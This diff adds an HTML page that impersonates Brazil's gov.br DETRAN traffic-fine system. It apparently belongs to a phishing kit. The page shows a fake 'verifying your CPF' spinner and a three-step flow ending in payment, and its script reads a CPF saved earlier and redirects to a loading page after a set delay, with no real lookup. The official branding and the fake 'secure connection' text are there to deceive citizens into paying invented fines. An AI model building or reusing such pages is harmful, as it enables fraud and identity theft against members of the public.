@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Regularize-se | DETRAN</title>
+    <link rel="icon" type="image/x-icon" href="../index_files/favicon.ico">
+    <link rel="stylesheet" href="../index_files/index-D3hvFbL-.css">
+    <script src="../vendor/tailwindcss.js"></script>
+</head>
+<body class="bg-gray-50">
+    <div id="root">
+        <div class="min-h-screen flex flex-col relative">
+            <header class="relative z-10 bg-white/95 shadow-sm border-b backdrop-blur-sm">
+                <div class="max-w-7xl mx-auto px-3 sm:px-4 h-14 flex items-center">
+                    <div class="flex items-center overflow-hidden min-w-0">
+                        <a class="flex items-center flex-shrink-0" href="#"><img src="../index_files/govbr-logo-large-CK1AxAnO.png" alt="gov.br" class="h-5 sm:h-6"></a>
+                        <div class="ml-2 pl-2 sm:ml-4 sm:pl-4 border-l border-gray-300 min-w-0">
+                            <h1 class="text-xs sm:text-sm font-medium text-gray-900 whitespace-nowrap overflow-hidden text-ellipsis">Sistema de Infrações e Multas</h1>
+                            <p class="text-xs text-gray-600 whitespace-nowrap overflow-hidden text-ellipsis">DETRAN - Departamento de Trânsito</p>
+                        </div>
+                    </div>
+                </div>
+            </header>
+
+            <div class="relative z-10 bg-slate-100/95 border-b border-slate-200 backdrop-blur-sm">
+                <div class="max-w-3xl mx-auto px-3 sm:px-4 py-2">
+                    <p class="text-xs sm:text-sm text-gray-700">Consulta de infrações de trânsito — <span class="font-medium text-gray-900">verificando CPF</span></p>
+                </div>
+            </div>
+
+            <main class="relative z-10 flex-1 flex items-start sm:items-center justify-center px-3 sm:px-4 py-8 sm:py-12">
+                <div class="w-full max-w-md">
+                    <div class="bg-white rounded-lg shadow-sm border overflow-hidden">
+                        <div class="px-5 py-4 border-b border-gray-100 bg-gray-50">
+                            <h2 class="text-base sm:text-lg font-semibold text-gray-900">Consultando CPF</h2>
+                            <p class="text-xs sm:text-sm text-gray-500 mt-1">Estamos verificando seus dados no sistema DETRAN.</p>
+                        </div>
+                        <div class="p-6 text-center">
+                            <div class="mx-auto mb-4 h-10 w-10 rounded-full border-4 border-blue-200 border-t-blue-700 animate-spin"></div>
+                            <p class="text-sm font-medium text-gray-800">Consultando seu CPF no DETRAN</p>
+                            <p class="text-xs text-gray-500 mt-1">Por favor, aguarde enquanto verificamos seus dados.</p>
+                            <p class="text-xs text-blue-700 mt-4">Conexão segura em andamento</p>
+                        </div>
+                    </div>
+
+                    <div class="mt-4 grid grid-cols-3 gap-3">
+                        <div class="bg-white rounded-lg border p-3 text-center"><p class="text-xs font-medium text-blue-700 mb-0.5">1. Consulta</p><p class="text-xs text-gray-500">Em andamento</p></div>
+                        <div class="bg-white rounded-lg border p-3 text-center"><p class="text-xs font-medium text-blue-700 mb-0.5">2. Detalhes</p><p class="text-xs text-gray-500">Aguardando</p></div>
+                        <div class="bg-white rounded-lg border p-3 text-center"><p class="text-xs font-medium text-blue-700 mb-0.5">3. Pagamento</p><p class="text-xs text-gray-500">Aguardando</p></div>
+                    </div>
+                </div>
+            </main>
+        </div>
+    </div>
+
+    <script>
+        const cpf = sessionStorage.getItem('cpf_lookup_cpf');
+        const params = new URLSearchParams(window.location.search);
+        const id = params.get('id') || '';
+        if (!cpf) {
+            window.location.replace('home.html');
+        } else {
+            setTimeout(function () {
+                window.location.replace(`carregando.html?id=${encodeURIComponent(id)}`);
+            }, 2400);
+        }
+    </script>
+</body>
+</html>
